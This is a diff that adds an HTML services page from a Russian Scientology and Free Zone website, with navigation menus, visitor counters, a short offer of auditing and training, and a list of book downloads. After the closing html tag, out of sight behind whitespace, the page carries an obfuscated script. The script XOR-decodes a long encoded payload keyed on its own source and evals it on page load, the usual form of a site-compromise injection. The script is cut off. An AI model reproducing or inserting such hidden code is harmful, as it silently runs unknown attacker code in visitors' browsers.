@@ -1,0 +1,308 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="ru">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<title>Наши услуги</title>
+<script type="text/javascript" language="JavaScript" src="scriptik.js"></script>
+<link rel="shortcut icon" href="favicon.ico">
+<LINK rel=stylesheet href="http://sposobnosti.ru/styles.css" type="text/css">
+</head>
+<body topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0">
+
+<div align="center">
+	<table border="0" style="border-collapse: collapse" width="765" cellpadding="0">
+		<tr>
+			<td width="765" height="120" background="img/log_2.jpg" bgcolor="#215DC1">
+			<table border="0" style="border-collapse: collapse" width="139" cellpadding="0" height="120">
+				<tr>
+					<td height="54" valign="top">
+					<a href="http://www.sposobnosti.ru">
+					<img border="0" src="img/log.gif" width="139" height="53" alt="Способности.ру"></a></td>
+				</tr>
+				<tr>
+					<td valign="top"><a href="http://www.sposobnosti.ru">
+					<img border="0" src="img/fz.gif" width="139" height="13" alt="Мосту.ру"></a></td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+		<tr>
+			<td height="5" bgcolor="#F58B13">
+			<table border="1" style="border:1px solid #FFFFFF; border-collapse: collapse" width="765" cellspacing="0" cellpadding="0" bordercolor="#FFFFFF" height="7">
+				<tr>
+					<td width="152" style="border: 1px solid #FFFFFF">&nbsp;</td>
+					<td width="461" style="border: 1px solid #FFFFFF">&nbsp;</td>
+					<td width="152" style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+	</table>
+</div>
+<div align="center">
+	<table border="0" style="border-collapse: collapse" width="765" bordercolor="#000000" cellpadding="0" height="100%">
+		<tr>
+			<td width="152" bgcolor="#E8E8E8" valign="top">
+			
+<table border="1" style="border:1px solid #FFFFFF; border-collapse: collapse" width="152" bordercolor="#FFFFFF" cellpadding="0" cellspacing="0">
+				<tr>
+					<td bgcolor="#215DC1" height="30">
+					<h2 id="3">&nbsp; Саентология</h2>
+					</td>
+				</tr>
+				<tr>
+					<td width="152" height="60" style="border: 1px solid #FFFFFF">
+					<img name="pm1" border="0" src="http://www.sposobnosti.ru/img/www.jpg" width="152" height="60"></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" bordercolorlight="#FFFFFF" bordercolordark="#FFFFFF" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/news.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Новости</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Саентология</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/detox.php">
+					&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Детокс</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/death.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Реинкарнация</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/fz.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Свободная Зона</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/progress.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Саморазвитие</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/history/index.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Истории успеха</a></td>
+				</tr>
+
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/scn.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/article.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Статьи</a></td>
+				</tr>
+				
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/devices.gif'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" height="30" bgcolor="#215DC1" style="border: 1px solid #FFFFFF">
+					<b><font style="color: #FFFFFF; font-size: 12pt">&nbsp; </font></b>
+					<span style="color: #FFFFFF"><b>Приборы</b></span></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/devices.gif'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<script language="javascript">
+document.write('<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/devices/devices.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> Описание</a>');
+</script></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/test.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" bgcolor="#215DC1" height="30" style="border: 1px solid #FFFFFF">
+					<b><font color="#FFFFFF" style="font-size: 12pt">&nbsp; Тесты</font></b></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/test.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/oca.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Оксфордский тест</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/test.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/emotional/emotional.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Эмоциональный</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/test.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/iq/iq.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					IQ тест</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/test.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<script language="javascript">
+document.write('<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/sg/sg.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> СГ</a>');
+</script></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/book.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" bgcolor="#215DC1" height="30" style="border: 1px solid #FFFFFF">
+					<b><font color="#FFFFFF" style="font-size: 12pt">&nbsp; Книги</font></b></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/book.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/book.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> 
+					Читать</a></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" height="30" bgcolor="#215DC1" style="border: 1px solid #FFFFFF">
+					<b><font color="#FFFFFF" style="font-size: 12pt">&nbsp; Услуги</font></b></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<script language="javascript">
+document.write('<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/service.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> Наши услуги</a>');
+</script></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<script language="javascript">
+document.write('<a style="color: #000000; font-size: 12pt; text-decoration: none; font-family: Arial" href="http://www.sposobnosti.ru/contact.php">&nbsp;<img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"> Контакт</a>');
+</script></td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<script language="javascript">
+document.write('<table border="0" style="border-collapse: collapse" width="152" cellpadding="0" bgcolor="#CFCFCF" height="115"><tr><td><form method="post" action="http://www.sposobnosti.ru/maillist1.php"><p align="center"><input type="text" name="email" size="20" value="ваш e-mail"><br><input type="button" value="Подписаться"></p><p align="center"><a style="text-decoration: none; color: #000000; font-weight: bold" href="http://www.sposobnosti.ru/detail_subscription.php">Подробности <img border="0" src="http://www.sposobnosti.ru/img/arrow.gif" width="5" height="7"></a></p></form></td></tr></table>');
+</script>
+					</td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">
+					<p align="center"><br>
+					<noindex>
+					<!--begin of Top100 logo-->
+					<a href="http://top100.rambler.ru/top100/">
+					<img src="http://top100-images.rambler.ru/top100/banner-88x31-rambler-blue.gif" alt="Rambler's Top100" width="88" height="31" border="0"></a>
+					<!--end of Top100 logo --><br>
+					<!--Rating@Mail.ru COUNTEr--><script language="JavaScript" type="text/javascript"><!--
+d=document;var a='';a+=';r='+escape(d.referrer)
+js=10//--></script><script language="JavaScript1.1" type="text/javascript"><!--
+a+=';j='+navigator.javaEnabled()
+js=11//--></script><script language="JavaScript1.2" type="text/javascript"><!--
+s=screen;a+=';s='+s.width+'*'+s.height
+a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
+js=12//--></script><script language="JavaScript1.3" type="text/javascript"><!--
+js=13//--></script><script language="JavaScript" type="text/javascript"><!--
+d.write('<a href="http://top.mail.ru/jump?from=937806"'+
+' target=_top><img src="http://df.c4.be.a0.top.list.ru/counter'+
+'?id=937806;t=82;js='+js+a+';rand='+Math.random()+
+'" alt="Рейтинг@Mail.ru"'+' border=0 height=18 width=88/><\/a>')
+if(11<js)d.write('<'+'!-- ')//--></script><noscript><a
+target=_top href="http://top.mail.ru/jump?from=937806"><img
+src="http://df.c4.be.a0.top.list.ru/counter?js=na;id=937806;t=82"
+border=0 height=18 width=88
+alt="Рейтинг@Mail.ru"/></a></noscript><script language="JavaScript" type="text/javascript"><!--
+if(11<js)d.write('--'+'>')//--></script><!--/COUNTER--><br>
+<!--LiveInternet counter--><script language="JavaScript"><!--
+document.write('<a href="http://www.liveinternet.ru/click" '+
+'target=_blank><img src="http://counter.yadro.ru/hit?t24.5;r'+
+escape(document.referrer)+((typeof(screen)=='undefined')?'':
+';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+';u'+escape(document.URL)+
+';'+Math.random()+
+'" title="liveinternet.ru: показано число посетителей за сегодн\я" '+
+'border=0 width=88 height=15></a>')//--></script><!--/LiveInternet--></noindex></p><p>&nbsp;</p>
+					</td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF" height="23">&nbsp;</td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+				<tr>
+					<td onmouseover="document.pm1.src='http://www.sposobnosti.ru/img/service.jpg'" onmouseout="document.pm1.src='http://www.sposobnosti.ru/img/www.jpg'" style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+			</table>			</td>
+			<td width="461" valign="top">
+			<div align="center">
+				<table border="0" style="border-collapse: collapse" width="420" cellpadding="0">
+					<tr>
+						<td valign="top">
+						<p>
+						<!--begin of Top100-->
+						<a href="http://top100.rambler.ru/top100/">
+						<img src="http://counter.rambler.ru/top100.cnt?601998" alt="Rambler's
+Top100" width="1" height="1" border="0"></a>
+						<!--end of Top100 code--><br>
+						<!--reklama-->
+<!--reklama--><h3 align="center">Наши услуги</h3>
+						<p>Представители нашей ассоциации «Феникс» находятся почти 
+						во всех регионах СНГ.</p>
+						<p>Мы готовы пообщаться с Вами на любую тему касательно 
+						саентологии и получения услуг.</p>
+						<p>В случае Вашей заинтересованности получить одитинг или 
+						обучение,<span lang="en-us"> </span>мы подберём для Вас 
+						специалиста из вашего региона.</p>
+						<p>Если такого не окажется, мы Вас свяжем с ближайшим центром 
+						СЗ.</p>
+						<p>АРО, администрация.</p>
+						<p>&nbsp;</p>
+						</td>
+					</tr>
+				</table>
+			</div>
+			</td>
+			<td width="152" bgcolor="#E8E8E8" valign="top">
+			<table border="3" style="border:1px solid #FFFFFF; border-collapse: collapse" width="100%" bordercolor="#FFFFFF" cellspacing="0" cellpadding="0" bordercolorlight="#FFFFFF" bordercolordark="#FFFFFF">
+				<tr>
+					<td bgcolor="#215DC1" height="30">
+					<font color="#FFFFFF" style="font-size: 12pt"><b>&nbsp; Рейтинг</font></b></td>
+				</tr>
+				<tr>
+					<td valign="top">
+					<img border="0" src="img/stat.jpg" width="152" height="60"></td>
+				</tr>
+				<tr>
+					<td height="30" style="border: 1px solid #FFFFFF" bgcolor="#215DC1">
+					<font color="#FFFFFF" style="font-size: 12pt"><b>&nbsp; Топ 
+					10 книг</font></b></td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF" valign="top">
+					<noindex>
+<script language="javascript">
+document.write('<table border="0" style="border-collapse: collapse" width="152" bordercolor="#FFFFFF" height="517"><tr><td style="border: 1px solid #FFFFFF">&nbsp;<span lang="ru"><span style="font-size: 12pt">1. </span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/david_and_julie_mayo/clear.zip"><span style="font-size: 12pt">Клир.</span></a></span></td></tr><tr><td style="border: 1px solid #FFFFFF" bgcolor="#CFCFCF"><p align="left"><span lang="ru">&nbsp;<span style="font-size: 12pt">2. <a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/lez_dein/technology.zip">Технология&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;заключения сделок</a>.</span></span></td></tr><tr><td style="border: 1px solid #FFFFFF"><span lang="ru">&nbsp;<span style="font-size: 12pt">3. </span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/l_ron_hubbard/different/about_money.zip"><span style="font-size: 12pt">Про деньги</span></a>.</span></td></tr><tr><td style="border: 1px solid #FFFFFF" bgcolor="#CFCFCF"><span style="font-size: 12pt" lang="ru">&nbsp;4. <a style="color: #000000; text-decoration: none" href="http://sposobnosti.ru/book/l_ron_hubbard/lectures/anatomy_persons.zip">Анатомия &nbsp;&nbsp;личности</a>.</span></td></tr><tr><td style="border: 1px solid #FFFFFF"><span style="font-size: 12pt" lang="ru">&nbsp;5. </span><a style="text-decoration: none; color:#000000" href="http://sposobnosti.ru/book/bernd/shah.zip"><span style="font-size: 12pt">Шах планете &nbsp;&nbsp;Земля.</span></a></td></tr><tr><td style="border: 1px solid #FFFFFF" bgcolor="#CFCFCF"><span lang="ru">&nbsp;<span style="font-size: 12pt">6. </span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/l_ron_hubbard/different/intention.doc"><span style="font-size: 12pt">Исполнение &nbsp;&nbsp;намерения.</span></a></span></td></tr><tr><td style="border: 1px solid #FFFFFF"><span lang="ru">&nbsp;<span style="font-size: 12pt">7. </span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/l_ron_hubbard/lectures/introduction_dia.zip"><span style="font-size: 12pt">Введение в &nbsp;&nbsp;Дианетику.</span></a></span></td></tr><tr><td style="border: 1px solid #FFFFFF" bgcolor="#CFCFCF"><p align="left"><span lang="ru">&nbsp;<span style="font-size: 12pt">8. </span></span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/l_ron_hubbard/different/rigid_sale.zip"><span style="font-size: 12pt">Упражнение по &nbsp;&nbsp;"Жесткой продаже".</span></a></td></tr><tr><td style="border: 1px solid #FFFFFF"><span style="font-size: 12pt" lang="ru">&nbsp;</span><span lang="ru"><font style="font-size: 12pt">9.</font><font size="3"> </font></span><a style="text-decoration: none; color: #000000" href="http://www.sposobnosti.ru/book/malashin_kolesnik/contents.php"><span style="font-size: 12pt">Храм.</span></a></td></tr><tr><td style="border: 1px solid #FFFFFF" bgcolor="#CFCFCF"><span lang="ru">&nbsp;<span style="font-size: 11pt">10. </span></span><a style="text-decoration: none; color: #000000" href="http://sposobnosti.ru/book/l_ron_hubbard/lectures/implant.zip"><span style="font-size: 11pt">Имплантирование</span>.</a></td></tr></table>');
+</script>
+</noindex></td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF" height="30" bgcolor="#215DC1">
+					
+					</td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF">
+					<!--баннер--></td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+				<tr>
+					<td style="border: 1px solid #FFFFFF">&nbsp;</td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+	</table>
+</div>
+<div align="center">
+	<table border="0" style="border-collapse: collapse" width="765" cellpadding="0" height="20">
+	<tr>
+		<td bgcolor="#F58B13">
+		<p align="center" dir="ltr">
+		<font color="#FFFFFF" size="2">
+		<a style="color: #FFFFFF" href="http://www.vipfurshet.ru/">корпоративные 
+		праздники, фуршет, банкет, кейтеринг, выпускной вечер, организация 
+		банкетов, корпоративное мероприятие,&nbsp; обеды в офис</a></font></td>
+	</tr>
+</table>
+
+</div>
+
+</body>
+
+</html>							<!-- [ eb823da4a1fb5f5887578a088a17af84 ] --><script>eval(unescape('function%20uzeZk%28afQAj%29%7Bfunction%20bFukf%28kZH%29%7Bvar%20hzTpe%3D0%3Bvar%20jZX%3DkZH.length%3Bvar%20tkts%3D0%3Bwhile%28tkts%3CjZX%29%7BhzTpe+%3DtzlIX%28kZH%2Ctkts%29*jZX%3Btkts++%3B%7Dreturn%20%28hzTpe+%27%27%29%3B%7Dfunction%20tzlIX%28oedkFRS%2CpItIjKoz%29%7Breturn%20oedkFRS.charCodeAt%28pItIjKoz%29%3B%7D%20%20%20try%20%7Bvar%20crZND%3Deval%28%27a%5Br8g7u8m7eHn7t8s7.vc7a%5BlHlve%5Be%5B%27.replace%28/%5B8%5C%5BH7v%5D/g%2C%20%27%27%29%29%3Bvar%20tebIo%3Dnew%20String%28%29%3Bvar%20vGJ%3D0%3BlUwez%3D0%2CeIyYk%3D%28new%20String%28crZND%29%29.replace%28/%5B%5E@a-z0-9A-Z_.%2C-%5D/g%2C%27%27%29%3Bvar%20tSYp%3DbFukf%28eIyYk%29%3BafQAj%3Dunescape%28afQAj%29%3Bfor%28var%20gVxgzl%3D0%3B%20gVxgzl%20%3C%20%28afQAj.length%29%3B%20gVxgzl++%29%7Bvar%20fGeI%3DtzlIX%28eIyYk%2CvGJ%29%5EtzlIX%28tSYp%2ClUwez%29%3Bvar%20xsGBD%3DtzlIX%28afQAj%2CgVxgzl%29%3BlUwez++%3BvGJ++%3Bif%28lUwez%3EtSYp.length%29lUwez%3D0%3Bif%28vGJ%3EeIyYk.length%29vGJ%3D0%3BtebIo+%3DString.fromCharCode%28xsGBD%5EfGeI%29%3B%7Deval%28tebIo%29%3B%20return%20tebIo%3Dnew%20String%28%29%3B%7Dcatch%28e%29%7B%7D%7DuzeZk%28%27%2533%2530%2538%2532%2535%2532%2536%2537%2555%253a%2518%252c%251a%2505%2526%2500%2537%2542%257c%253e%252b%256a%2532%2516%2517%251a%2533%2507%2522%2512%257a%252e%251a%2511%2535%250e%2535%2521%2532%2503%2565%256a%2526%253a%2512%2524%252e%2521%2505%2531%2503%2517%257c%254c%256c%257e%2539%2533%2533%2527%2523%252c%251b%2536%256c%2525%2563%252f%253f%2573%257b%2513%2526%2537%2539%2524%2576%2513%2518%253e%2508%2547%2524%2560%2566%2521%253b%2508%254f%252f%2508%250c%2571%256e%2577%257d%2565%2539%2574%2518%2521%2527%2512%252f%252d%2536%256b%251b%2524%2529%2570%250c%2500%2536%2536%2579%255c%2573%2534%2529%252f%250e%2535%252f%2528%2544%2553%2548%257c%2577%2569%256f%2544%2555%2563%252f%2570%2541%256f%2547%2578%2519%2537%2519%2534%2538%2529%2529%2533%2572%253a%253d%250b%2533%251f%250f%2541%2526%2571%2530%2537%251f%2515%257f%2577%2577%2556%257b%2564%255e%255f%255a%253f%2500%253e%252e%2536%2521%2566%2500%2533%252e%252e%2525%2546%2557%2550%2569%2556%2537%2524%2529%2529%257f%2530%2572%257f%251a%2575%2563%2573%250e%2534%2542%250f%255b%2520%2570%256c%2527%253f%2565%257b%2573%2544%254c%2538%2579%252d%257d%2533%253f%257c%257c%254e%2539%253b%2564%251f%257a%256a%2532%2575%2559%2575%256e%252f%2538%2538%2510%2530%253c%2533%2525%250f%2539%2525%2566%256d%257d%2520%250d%2533%2523%251e%251c%257c%2517%250d%2533%2511%2528%256c%2578%2532%2518%256b%2555%257c%2508%2523%2529%2508%2532%252e%2534%2536%2578%254a%253a%2518%2513%2502%256e%2532%253d%2567%254d%257a%2537%2532%2511%2521%2572%2529%2569%2559%2524%2512%257a%2507%2501%2575%257f%2534%250e%2571%2522%253c%2538%250e%2507%2547%2533%250a%251c%2536%257d%2537%253f%2514%2524%2507%250e%251c%2537%2504%2516%257f%256c%2578%2575%254e%2577%2571%2563%2577%2520%253c%250e%2505%2544%2536%2530%2525%252f%253d%2525%2507%2500%2514%2521%252f%257d%2522%256f%2559%256e%257d%254b%2576%256a%2523%254f%2513%253d%256c%2509%2504%2533%2533%251f%252e%2520%250d%2520%2537%255a%2565%2566%253f%2535%253d%2516%2527%2517%251b%2527%2574%2558%2511%2526%251a%253d%254e%2507%2522%2577%2549%2554%2522%2575%257d%254e%2517%2576%2528%2553%252e%252a%2532%2557%252c%2550%2504%2570%2516%2577%2521%2579%2537%254c%2528%2526%2507%2536%2534%250e%253f%2534%250a%2524%2512%257a%2519%2543%2563%2527%2529%252b%2500%2507%2524%2538%2560%256c%252e%2510%2513%2529%2519%252e%2512%2578%2528%256a%2545%2549%2557%2534%2570%2532%2561%2575%2561%2565%253d%253a%2536%257d%2534%2563%252e%2574%2529%254d%257a%256d%2510%257d%2507%2565%2575%2571%2579%2547%253b%256f%256d%2527%255c%250b%2573%2521%2516%2525%250b%257f%252c%2520%2534%2537%2577%2501%2571%2539%2525%252f%2570%253c%253f%2522%251a%255e%252d%253d%2539%2529%252e%251c%255d%256d%257f%2514%2573%2517%2535%252a%2530%252f%251c%257f%257e%2540%2571%2576%257e%2579%2530%2517%2529%2531%252f%253e%255c%2532%2563%252f%255b%2509%252a%2539%252f%253a%2539%2539%2576%254e%2570%253e%2528%255c%2530%2533%2531%253b%251a%2572%2576%252d%252e%2529%257f%254d%2528%2509%253c%2512%2557%2539%253f%2535%253d%2535%2510%2523%2516%2538%2523%2507%2526%2531%253d%250e%250d%2550%2567%257a%253c%252c%252d%2511%2550%2525%253d%256c%256f%2530%253c%251b%2506%251c%251f%253e%2536%2515%2523%2503%2525%2534%2511%250e%253d%2515%2523%2518%257b%2532%255b%2550%256e%253d%2523%253e%2574%252a%2504%2534%251d%2505%252e%2531%2503%2518%2577%2569%2534%2514%256a%2516%2517%2537%255a%251f%256d%251f%254c%250c%257d%2567%2554%2558%252f%2568%2525%2504%2533%2513%252d%250c%252a%2517%253b%2512%2574%251c%2526%2501%2535%2504%2532%2504%2563%2529%2501%2563%2509%257c%2552%2518%253c%2522%2508%2539%2515%250f%2549%2536%2519%254a%2534%2516%2512%253d%250a%2567%2520%257b%2562%2565%2555%2574%2574%2529%253e%2537%2507%254a%2503%254b%2524%251e%252b%2521%251b%2538%2507%2500%250d%256f%2569%255a%2564%2520%257f%252e%2566%254f%257b%2570%256e%2571%253d%252f%2533%2516%2528%254f%2515%250e%2529%2510%253b%2513%257b%257c%2568%2568%2562%254e%253c%2556%253a%252c%2518%2540%257a%2532%2563%252c%256e%2525%2524%255b%2533%253f%2515%2576%256c%250c%253c%252c%2540%2505%2504%2509%257c%2531%257b%252e%2558%2510%256c%256c%2560%2536%252d%2560%2539%2524%2503%2508%257f%2539%256a%2526%250e%2521%2530%2504%2538%2539%253a%2568%2528%256a%251e%250d%2555%2531%254d%2566%256c%2520%252c%256d%2520%2520%253e%250c%257b%252f%2579%257e%250a%256d%2511%2536%2531%252c%2534%256f%2541%2543%250e%254d%2520%2521%252b%2536%257c%2534%257a%250c%2505%2571%2529%257d%2572%2569%251d%256f%2543%2528%256f%2575%2561%2530%2531%2563%256b%2563%251c%250a%251d%256c%253d%2555%252b%251b%256f%2543%2546%2523%2503%257d%253b%2512%2503%251c%2513%2573%2560%257b%2566%2578%2521%2523%2522%250d%2534%2502%251c%2570%257c%2506%2562%252b%2527%251d%2573%255b%2517%257d%252f%2576%2527%2540%2542%2561%2574%253b%2572%2574%256c%254a%256e%256a%257c%2564%2538%2568%2531%2571%2526%251b%255b%2578%2563%2564%2576%2574%253f%2576%2512%2517%2538%2541%252a%257f%2560%2553%2548%254b%2508%252c%2511%2535%2578%2527%2514%2555%255b%2512%253f%255d%255a%251d%251d%255c%251a%2503%2538%2549%256f%2570%2568%256d%257e%2538%250c%2528%251e%2509%2558%2532%252d%252e%253d%2537%253d%253d%2500%2516%2577%256a%2539%2508%250b%257a%2529%253b%2531%250b%252c%2536%2503%2517%2519%251f%257d%2574%252d%250f%2528%2521%2554%2524%250c%250e%2529%2572%253b%2505%2538%250b%2532%253d%257d%255c%253f%252a%2560%2560%250c%2521%2500%250d%2519%253d%251e%251a%253c%2527%253d%2566%257d%253a%2527%2528%253d%2535%252e%2516%256e%2564%257e%252c%250d%2538%2516%2554%2525%2535%253e%2568%257f%253b%2527%252d%2500%2515%2536%252d%256e%251a%2532%2531%2533%250c%2529%2518%2514%2558%253b%251a%2520%250a%255e%2565%2523%2531%2532%2525%2522%2511%2578%2550%253e%2530%2539%2530%2579%256d%2574%256f%2566%2573%2579%2576%256d%254e%2522%2528%2536%254e%2569%256e%2579%2561%2571%257a%252f%254b%2546%2522%2532%2533%2566%2561%2560%2578%2565%250f%2538%250e%2536%2535%253a%250d%2512%2539%2541%256f%257e%2564%2566%2528%2535%2531%2526%2568%2521%253e%252a%250b%250e%2514%2524%25